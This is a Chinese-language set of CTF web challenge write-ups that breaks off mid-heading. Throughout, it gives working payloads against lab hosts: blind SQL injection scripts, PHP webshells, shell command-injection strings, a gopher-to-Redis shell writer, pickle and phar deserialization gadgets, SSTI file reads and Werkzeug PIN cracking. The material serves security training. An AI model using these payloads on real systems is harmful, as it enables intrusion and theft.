u input the correct password then u can get the flagand p3rh4ps wants a girl friend.select * from users where username='$_POST[&quot;username&quot;]' and password='$_POST[&quot;password&quot;]'; 过滤了select，=，'，union，and，;，&quot; 可以在username 使用\\转义单引号，就可以在 password 处执行查询了，之后就是常规盲注。抄个脚本： 123456789101112131415161718192021222324252627282930313233import requestsurl = &quot;http://bc5d0433-45b5-486d-8fdd-541a8662fd10.node3.buuoj.cn/index.php&quot;data = {&quot;username&quot;:&quot;admin\\\\&quot;,&quot;password&quot;:&quot;&quot;}result = &quot;&quot;i = 0while( True ): i = i + 1 head=32 tail=127 while( head &lt; tail ): mid = (head + tail) &gt;&gt; 1 #payload = &quot;or/**/if(ascii(substr(username,%d,1))&gt;%d,1,0)#&quot;%(i,mid) payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;%(i,mid) data['password'] = payload r = requests.post(url,data=data) if &quot;stronger&quot; in r.text : head = mid + 1 else: tail = mid last = result if head!=32: result += chr(head) else: break print(result) [BJDCTF2020]Mark loves catgit 源码泄露 1234567891011121314151617181920212223&lt;?phpinclude 'flag.php';$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = 'yds';foreach($_POST as $x =&gt; $y){ $$x = $y;}foreach($_GET as $x =&gt; $y){ $$x = $$y;}foreach($_GET as $x =&gt; $y){ if($_GET['flag'] === $x &amp;&amp; $x !== 'flag'){ exit($handsome); }}if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){ exit($yds);}y'd'sif($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ exit($is);}echo &quot;the flag is: &quot;.$flag; 看着很复杂，不要有思维定势觉得一定要走到最后一行，实际上在exit()中就可以得到结果。几个 exit 条件中，不传入 flag 的这一条最容易实现，会输出 $yds，所以直接 GET 传入yds=flag，会把真正的flag赋值给$yds，再 exit 就得到了flag。 [BUUCTF 2018]Online Tool同时使用escapechellargs和escapeshellcmd会出现问题，用单引号包含的参数会导致参数注入。 1234567' &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php '# escapeshellargs先对单引号转义\\' &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php \\'# 然后对反斜线分隔的每个部分加单引号''\\'' &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php '\\'''# escapeshellcmd对其他特殊字符转义，但不转义单引号''\\\\'' \\&lt;\\?php \\@eval(\\$_POST\\[\\&quot;hack\\&quot;\\]);\\?\\&gt; -oG hack.php '\\\\''' [CISCN2019 总决赛 Day2 Web1]Easyweb有robots.txt，看到*.php.bak，看看index的源码，有个image.php还有user.php，image.php.bak可以下载。 1234567891011121314151617include &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); addslashes在单双引号、反斜杠和空字符前加上反斜杠，strreplace把数组中的内容删除。 这里思路窄了，以为只要一个位置就可以，怎么也弄不出来单引号。但实际上在path后面有一个单引号，只要有一个反斜杠来转义id后面的引号就可以了。可以使用\\\\0，addslashes变成\\\\\\\\0，strreplace变成\\。由于没有显示位，使用布尔盲注。当id=1时有图片，id=0时显示有错误。 [CISCN 2019 初赛]Love Math函数： 123456scandir() # 返回指定目录中的文件和目录的数组base_convert() # 转换禁止dechex() # 十进制转为十六进制hex2bin() # 十六进制转为ASCII字符var_dump() # 输出变量信息readfile() # 输出文件 特性： 动态函数：可以把函数名用字符串传递给变量，通过此变量动态调用函数。$func='die';$func(); 函数名默认为字符串 12345678910111213141516171819202122232425262728 &lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c'])){ show_source(__FILE__);}else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(&quot;太长了不会算&quot;); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '&quot;', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(&quot;请不要输入奇奇怪怪的字符&quot;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(&quot;请不要输入奇奇怪怪的函数&quot;); } } //帮你算出答案 eval('echo '.$content.';');} 不能出现blacklist中的内容，preg_match_all得到的内容必须在whitelist里，同时payload有长度限制。 方法一：构造$_GET $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=ls / 12345base_convert(37907361743,10,36) ==&gt; &quot;hex2bin&quot;dechex(1598506324) ==&gt; &quot;5f474554&quot;base_convert(37907361743,10,36)(dechex(1598506324))==&gt; hex2bin(&quot;5f474554&quot;) ==&gt; &quot;_GET&quot;$_GET{pi}{$_GET{abs}} ==&gt; system('ls /'') 方法二：构造getallheaders $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1}) 123base_convert(696468,10,36) =&gt; &quot;exec&quot;$pi(8768397090111664438,10,30) =&gt; &quot;getallheaders&quot;exec(getallheaders(){1}) 发包时用burp抓包，在headers添加1: cat /flag 方法三：异或 fuzz： 1234567891011&lt;?php$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];for($k=1;$k&lt;=sizeof($payload);$k++){ for($i = 0;$i &lt; 9; $i++){ for($j = 0;$j &lt;=9;$j++){ $exp = $payload[$k] ^ $i.$j; echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;); echo &quot;&lt;br /&gt;&quot;; } }} $pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag [CISCN2019 华北赛区 Day1 Web2]ikun先注册个账号，找到lv6的号， 123456789import requestsurl = &quot;http://26f12b49-df5d-419d-9c3a-50988d616703.node1.buuoj.cn/shop?page=&quot;for i in range(1000): r = requests.get(url + str(i)) if &quot;lv6.png&quot; in r.text: print i break 然后购买，抓包，把discount改成0.000000000001，就可以买下来。 发现只有admin可以访问，查看cookie，有一个jwt，到 jwt.io ，解码，把 username 改为admin ，用 https://github.com/brendan-rius/c-jwt-cracker，跑出签名为 1Kun，再到 jwt.io得到 jwt，eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo，用edit this cookie改成新的jwt，刷新可以看到 “一键成为大会员”，也可以看到源码，打开源码里面admin.py，看到pickle.loads(urllib.qoute(become))，（反序列化文章，http://www.sohu.com/a/274879579_729271），一键成为大会员按钮会post一个 become 参数，利用反序列化漏洞读取flag 123456789&gt;&gt;&gt; import urllib&gt;&gt;&gt; import pickle&gt;&gt;&gt; class a(object):... def __reduce__(self):... return (eval,(&quot;open('/flag.txt','r').read()&quot;,))...&gt;&gt;&gt; a = pickle.dumps(a())&gt;&gt;&gt; a = urllib.quote(a)&gt;&gt;&gt; print a 得到c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.，抓包，把become=admin改成上面的字符串，得到flag [CISCN2019 华北赛区 Day2 Web1]Hack World一共就两条数据，过滤了空格，and，or，布尔盲注。 可以使用id=0^[payload]或者id=if([payload],1,2)。后者只能用于数字型。 12345678910111213141516171819import requestsurl = &quot;http://c30faac4-d474-4905-a58f-c43c968a74ac.node3.buuoj.cn:80/index.php&quot;i = 1while True: left = 32 right = 127 while True: if right - left == 1: print(chr(right), end='') break mid = int((right+left)/2) data = {&quot;id&quot;: &quot;if(ascii(mid((select(flag)from(flag)),{},1))&gt;{},1,2)&quot;.format(i, mid)} r = requests.post(url, data=data, proxies={'http':'127.0.0.1:9999'}) if 'Hello' in r.text: left = mid else: right = mid i += 1 可能是在print()函数中用end关键字参数的话不会刷新缓冲区，大概觉着跑完了就Ctrl+C，就能看到结果了 = =。 [CISCN2019 总决赛 Day2 Web1]Easywebrobots.txt，有 image.php.bak 123456789101112131415161718&lt;?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); 不应该过\\\\0,传入\\0,加反斜线变成\\\\\\0，过之后变成\\，可以逃逸。 12image.php?id=\\0&amp;path=+or+id=3+order+by+2%23 # 成功image.php?id=\\0&amp;path=+or+id=3+order+by+3%23 # 失败 盲注 123456789101112131415161718192021222324252627import requestsurl = &quot;http://b74c9739-071c-4a0f-9c97-f7eff3e4438e.node3.buuoj.cn/image.php&quot;result = ''for i in range(0, 30): right = 127 left = 32 mid = int((right + left) &gt;&gt; 1) while right &gt; left: payload = &quot; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d,1,0)#&quot; % (i, mid) # select group_concat(column_name) from information_schema.columns where table_schema=database() # params = { 'id': '\\\\0', 'path': payload } response = requests.get(url, params=params) if &quot;JFIF&quot; in response.text: left = mid + 1 else: right = mid mid = int((right + left) &gt;&gt; 1) result += chr(mid) print(result) 回显位置，发现是 php，有上传的文件名。再次上传文件名为 php 木马的文件，连接日志文件获得 shell 1logs/upload.1de80834766269f33c963dd093dee010.log.php 文件名 1&lt;?=@eval($_POST['c']);?&gt; [CISCN2019 华东南赛区]Web11Smarty 模板注入，可以使用一些 php 语句 12{if show_source('/flag')}{/if}{readfile('/flag')} [CISCN2019 华北赛区 Day1 Web1]Dropbox走一遍正常流程，注册登录，上传只能传图，下载的地方抓一下包，filename这里有路径穿越，读了index, upload, download, class, delete, login，开始审计。 upload里面会检查文件类型，然后把后缀名改成图片的类型，默认是gif。 download限制了文件名长度，其中不能含有flag。 重点是class.php，其中有3个类，FIle, Filelist, User 123456class File { public $filename; public function close() { return file_get_contents($this-&gt;filename); }} FIle类中的close()有file_get_contents()可以用来获取flag，但是没有输出 123456class User { public $db; public function __destruct() { $this-&gt;db-&gt;close(); }} User类中有__destruct()，在User类销毁的时候可以调用db的close方法，如果db是一个File类的实例，就能调用FIle的close读取flag，但还是不能输出。 123456789101112131415161718192021222324252627class FileList { private $files; private $results; private $funcs; public function __call($func, $args) { array_push($this-&gt;func, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = 'html...'; $table .= 'html...'; foreach ($this-&gt;funcs as $func) { $table .= 'html...'; } $table .= 'html...' foreach ($this-&gt;results as $filename =&gt; $result) { $table .='html..'; foreach ($result as $func =&gt; $value) { $table .= '..'.htmlentities($value).'..'; } $table .= '...'.htmlentities($filename).'..'; } echo $table; }} FileList 类中有__call()，可以调用File的close()，还能存储结果输出出来。 思路：创建一个User类的对象，它的db变量是一个FileList对象，FileList的files变量是包含一个File对象的数组，这个File对象的filename变量是flag的位置。User对象销毁时会调用db的close()，db是一个FIleLIst对象，没有close()的情况下会调用__call()，再调用File（$filename=’/flag.txt’）的close()，返回值存到FileList的$result里，再打印出来。 可以利用phar创建符合以上要求的对象，可以参考博客里的 phar扩展php反序列化攻击面。生成phar： 1234567891011121314151617181920212223242526272829&lt;?phpclass User { public $db;}class File { public $filename;}class FileList { private $files; private $results; private $funcs; public function __construct() { $file = new File(); $file-&gt;filename = '/flag.txt'; $this-&gt;files = array($file); $this-&gt;results = array(); $this-&gt;funcs = array(); }}@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;jwt.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt; 很多文件系统函数可以触发phar的反序列化，这个网站有上传、下载和删除操作，都看一遍，上传和下载都没什么，删除的地方有个unlink，正好可以利用，把生成的phar后缀名改成jpg，上传，在删除的地方抓包，可以得到flag。 [De1CTF 2019]SSRF Me123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500 result['msg'] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot;def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) 分为3个路由，geneSgn生成'scan' + param的md5。index给你看一下源代码。challenge接受action，param，sign三个参数，param过一下waf（不能以gopher或者file开头），进入Exec，首先检查secret_key + param + action的md5与 sing 是否一致，然后判断 scan 和 read 是否在action中。如果含有scan则把param文件写入tmpfile，含有read返回tmpfile的内容。 解法一：哈希长度扩展攻击 secret_key长度16，geneSign?param=flag.txt 可以得到 md5(secret_key + 'flag.txt' + 'scan')，目的是获取md5(secret_key + 'flag.txt' + action)其中action含有read。可以使用哈希长度扩展攻击。 得到action 为 scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%a0%00%0 0%00%00%00%00%00read时的md59b02232286ed9dd4f7e52eba63094180，发包即可。 12345678910import requestsurl = 'http://63904195-027d-4866-a049-78fd37f2a920.node3.buuoj.cn/De1ta?param=flag.txt'cookies = { 'sign': '9b02232286ed9dd4f7e52eba63094180', 'action': 'scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read', }r = requests.get(url, cookies=cookies)print(r.text) 解法二：字符串拼接 问题在于geneSign处，返回的md5是scret_key + flag.txt + scan，即&lt;secret_key&gt;flag.txtscan，所以直接访问/geneSign?param=flag.txtread得到的md5就是&lt;secret_key&gt;flag.txtreadscan的MD5，用这个MD5作为sign访问/De1ta?param=flag.txt，action为readscan，直接可以得到flag。 urllib.urlopen()可以用file://包含文件，这里过滤了，可以使用local_file:代替。 easy tornadohint.txt里面告诉了filehash的生成方式，需要我们找到cookie_secret。 welcome.txt 写了render，flag.txt里给了flag的路径。 http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/file ?filename=/fllllllllllllag，提示Error，同时url变成http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/error?msg=Error，结合上面的render可以想到模板注入获得cookie_secret。 http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/error?msg={{handler.application.settings}}，得到cookiesecet，e85fca1a-db5a-4d80-82aa-53d3a3d1637a ，MD5一下 12345678import hashlibcs = 'e85fca1a-db5a-4d80-82aa-53d3a3d1637a'fn = /fllllllllllllagdef md5(s): md5 = hashlib.md5 md5.update(s.encode()) return md5.hexdigest()print(md5(cs+md5(fn))) http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/file ?filename=/fllllllllllllag &amp;filehash=a7982b91f8645e9107b05b0721a6fceb [GKCTF2020]cve版签到含有提示 cve-2020-7066，查一下，getheaders函数存在00截断，tips 要求结尾是123 1?url=http:%2f%2f127.0.0.123%00www.ctfhub.com [GKCTF2020]老八小超市儿shopxo后台全版本获取shell复现 访问后台/admin.php?s=/admin/logininfo.html，使用admin:shopxo登录 找到 应用中心 应用商店 主题，下载粉红主题，在主题的 default/_static_/目录下添加木马，重新压缩 到 网站管理 主题管理 主题安装，上传压缩后的主题，l连接木马路径/public/static/index/lengyu/shell.php 根目录下的 flag 文件提示 flag 在 root 下，但无权限。根目录有 auto.sh，定时运行 makeflag，找到该文件，改为 12import osos.system(&quot;cat /root/flag&gt;/1.txt&quot;) 等待一分钟，得到 flag [GKCTF2020]EZ三剑客-EzWeb访问 secret ，除了 127.0.0.1 以外还有两个 IP 地址，173.183.118.10/24 和 172.18.0.13/12，应该是一个 SSRF，扫描一下 173.183.118.10/24 子网里的其他主机， 过滤了 file://和dict://协议，使用 HTTP 探测 使用 intruder 爆破，在 173.183.118.12 的响应中看到 1被你发现了,但你也许需要试试其他服♂务,就在这台机子上! ...我说的是端口啦1 爆破这台机器的端口，在 6379 端口看到 1-ERR wrong number of arguments for 'get' command 存在 redis 服务 使用 gopher 协议利用未授权访问写入 shell 12345678910111213141516171819202122232425262728293031323334353637import urllibprotocol = r&quot;gopher://&quot;ip = &quot;173.183.118.12&quot;port = &quot;6379&quot;shell = &quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename = &quot;shell.php&quot;path = &quot;/var/www/html&quot;passwd = &quot;&quot;cmd = [&quot;flushall&quot;, &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;, &quot;${IFS}&quot;)), &quot;config set dir {}&quot;.format(path), &quot;config set dbfilename {}&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0, &quot;AUTH {}&quot;.format(passwd))payload = protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF = &quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd = &quot;&quot; cmd += &quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd += CRLF+&quot;$&quot; + \\ str(len((x.replace(&quot;${IFS}&quot;, &quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;, &quot; &quot;) cmd += CRLF return cmdif __name__ == &quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload 生成 payload 1gopher://173.183.118.12:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A 在 url 中访问 http://173.183.118.12/shell.php [GKCTF2020]CheckIN把 base64 编码后的命令传入Ginkgo后就可以执行 1?Ginkgo=cGhwaW5mbygpOw== #phpinfo(); 存在 disable_functions，禁用了一些执行系统命令的函数。本质上是一个黑名单。 1?Ginkgo=QGV2YWwoJF9HRVRbJ2MnXSk7&amp;c=phpinfo(); # @eval($_GET['c']); 测试成功，使用蚁剑连接，发现根目录下的 flag，不可读。存在 readflag 二进制文件。 使用 Github 上的 PHP 7.0-7.3 disable_functions bypass，项目地址，使用 gc-bypass，修改其中的命令为 /readflag，上传至 /tmp，include 上传的文件 1?Ginkgo=QGV2YWwoJF9HRVRbJ2MnXSk7&amp;c=include('/tmp/exploit.php'); 得到 flag [GXYCTF2019]BabyUpload上传 .htaccess 修改类型，上传图片马，蚁剑连接。有个坑，蚁剑不能连 GET 的马。 [GXYCTF2019]禁止套娃12345678localeconv() 函数返回一包含本地数字及货币格式信息的数组。scandir() 列出 images 目录中的文件和目录。readfile() 输出一个文件。current() 返回数组中的当前单元, 默认取第一个值。pos() current() 的别名。next() 函数将内部指针指向数组中的下一个元素，并输出。array_reverse()以相反的元素顺序返回数组。highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。 存在.git泄露，得到源码。同时存在白名单和黑名单 1exp=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); [GXYCTF2019]Ping Ping Ping命令执行，过滤了空格和很多特殊字符。 12345678?ip=1.1.1.1|ls //发现index.php和flag.php?ip=1.1.1.1|cat flag.php //发现过滤了空格?ip=1.1.1.1|cat&lt;flag.php //过滤了特殊字符?ip=1.1.1.1|cat$IFS$1flag.php //用$IFS$1代替空格,发现过滤了flag?ip=1.1.1.1|cat$IFS$1index.php //查看源码，发现过滤了特殊字符、bash、空格、flag?ip=1.1.1.1;a=g;cat$IFS$1fla$a.php //利用shell变量绕过flag的过滤?ip=1.1.1.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh //用sh执行?ip=1.1.1.1;cat$IFS`ls` //内联执行，反引号内的命令输出作为输入 [GXYCTF2019]BabySQli试了一下，用户名的位置会报错，只过滤了括号，=和小写的or，页面里有注释，先 base32 再 base64，select * from user where username = '$name'。 有3列，试一下admin' union select 1,2,3%23，提示wrong pass。是对输入的 pw 进行了 md5，然后查表中的数据，最后 1name=rrrrrrrrrr' union select 1,'admin','202cb962ac59075b964b07152d234b70'%23&amp;pw=123 其中202cb962ac59075b964b07152d234b70'%23是 123 的MD5。 [GWCTF 2019]我有一个数据库phpMyadmin 任意文件包含 payload:http://92909cd3-f955-4efa-99af-dc3d378a1ec6.node3.buuoj.cn/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag [GWCTF 2019]枯燥的抽奖check.php 12345678910111213141516171819202122232425262728&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION['seed'])){$_SESSION['seed']=rand(0,999999999);}mt_srand($_SESSION['seed']);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }$str_show = substr($str, 0, 10);echo &quot;&lt;p id='p1'&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST['num'])){ if($_POST['num']===$str){x echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;; } else{ echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;; }}show_source(&quot;check.php&quot;) mt_rand()漏洞，伪随机，可以爆破 seed 123456789101112str1 = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'str2 = 'LTa1ZXoMsb'str3 = str1[::-1]length = len(str2)res = ''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res += str(j) + ' ' + str(j) + ' ' + '0' + ' ' + str(len(str1) - 1) + ' ' breakprint(res) 生成 php_mt_seed 所需的参数后 12maketime ./php_mt_seed 47 47 0 61 55 55 0 61 0 0 0 61 27 27 0 61 61 61 0 61 59 59 0 61 14 14 0 61 48 48 0 61 18 18 0 61 1 1 0 61 爆破出 seed 之后重新生成 str，至少需要 PHP 7.2 123456789101112&lt;?phpmt_srand(945888871);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }echo $str;?&gt; [GYCTF2020]FlaskApp模板注入，加密页面输入 1{{1+1}} 把结果放到解密页面解密，得到 2，存在模板注入。payload 1{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}} 可以读取到文件，但是不知道 flag 位置，需要打开 debug 模式中的 python shell，需要获取 PIN 码 PIN 码由以下几个值计算得到： 服务器运行 flask 的用户名，通过读取 /etc/passwd 得到，此题目为 flaskweb modname，一般为 flask.app getattr(app, &quot;\\_\\_name__&quot;, app.\\_\\_class__.\\_\\_name__)，一般为 Flask flask 库下 app.py 的绝对路径，通过报错信息可以得到，本题目为/usr/local/lib/python3.7/site-packages/flask/app.py 当前网络 MAC 地址的十进制数，通过文件/sys/class/net/eth0/address得到 机器ID，一般在/etc/machine-id或者/proc/sys/kerne/random/boot-i，docker 容器在/proc/sef/cgroup，name=systemd:/docker/后面的一串就是ID 计算 PIN 码，在Lib\\site-packages\\werkzeug\\debug\\\\_\\_init__.py 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', # 用户名 'flask.app', # modname 'Flask', # Flask '/usr/local/lib/python3.7/site-packages/flask/app.py', # app.py 路径]private_bits = [ '2485410412221', # MAC 地址 '6743637069af7e10cfc09a74d23b62c700765cc89e2ae6d0f43150e839dde80e' # 机器ID]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 得到 PIN 码进入 python shell，使用 os 模块执行系统命令 123import osos.popen('ls /').read()os.popen('cat /this_is_flag.txt').read() [GYCTF2020]Blacklist黑名单preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject); 堆叠注入 + handler 代替 select 1231'; show tables;# 查表1'; show columns from FlagHere;# 查列名1'; handler FlagHere open as aaaa; handler aaaa read first; handler aaaa close;# 利用 handler 代替 select 查询数据 [HCTF] 2018 